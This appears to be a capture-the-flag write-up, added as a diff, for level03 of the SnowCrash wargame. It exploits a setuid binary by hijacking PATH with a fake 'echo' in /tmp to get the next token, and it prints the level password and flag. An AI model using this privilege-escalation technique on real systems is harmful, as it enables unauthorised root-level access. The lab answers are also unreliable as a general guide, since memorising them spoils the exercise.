@@ -1,0 +1,23 @@
+flag02@SnowCrash:~$ su level03
+Password: kooda2puivaav1idi4f57q8iq
+
+level03@SnowCrash:~$ ls -l
+-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+The ’s’ in the permissions tell us that we have the same permissions as the owner of the file when executing it.
+
+level03@SnowCrash:~$ pwd
+/home/user/level03
+
+level03@SnowCrash:~$ id
+uid=2003(level03) gid=2003(level03) groups=2003(level03),100(users)
+
+level03@SnowCrash:~$ ./level03
+Exploit me
+
+With ‘strings level03’ we find the command ‘/usr/bin/env echo Exploit me’, so we will change the path to echo and we will make it redirect on a copy of the executable /bin/getflag and with root permissions it will gives us directly the password to level04. 
+
+level03@SnowCrash:~$ cat /bin/getflag > /tmp/echo
+level03@SnowCrash:~$ chmod +x /tmp/echo
+level03@SnowCrash:~$ export PATH=/tmp
+level03@SnowCrash:~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
